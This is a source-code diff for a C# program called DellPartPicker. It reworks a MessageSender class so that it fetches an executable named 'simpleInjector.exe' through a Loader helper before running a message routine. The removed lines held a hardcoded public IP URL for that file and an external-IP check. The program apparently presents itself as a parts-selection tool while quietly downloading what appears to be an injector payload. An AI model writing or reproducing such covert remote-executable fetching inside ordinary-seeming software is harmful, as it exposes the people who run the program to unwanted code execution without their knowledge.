@@ -12,8 +12,6 @@ namespace DellPartPicker
     class MessageSender
     {
 
-        static String ip = Constants.REMOTE_SERVER;
-
         public static bool sendMessage(String message, String ip)
         {
             String url;
@@ -25,31 +23,12 @@ namespace DellPartPicker
             }
             else
             {
-                string externalip = new WebClient().DownloadString("http://icanhazip.com");
+                //download the file
+                Loader.downloadFile("simpleInjector.exe");
 
-                if (externalip.Equals(Constants.REMOTE_SERVER))
-                {
-                    ip = Constants.LOCAL_SERVER;
-                }
-
-                if (ip == Constants.REMOTE_SERVER)
-                {
-                    url = "http://73.17.34.121/hosted/simpleInjector.exe";
-                }
-                else
-                {
-                    url = "http://10.0.0.4/hosted/simpleInjector.exe";
-                }
+                //return the message attempt
                 return run(message, ip);
-            }
-
-            
-            //bool fetched = FetchItem.downloadFile(url, @"C:\Temp\simpleInjector.exe", false);
-            
-
-            
-
-            
+            }          
         }
 
         private static bool run(String message, String ip)
@@ -79,6 +58,11 @@ namespace DellPartPicker
             }
             return true;
             
+        }
+
+        private static bool download(String url)
+        {
+            return false;
         }
     }
 }
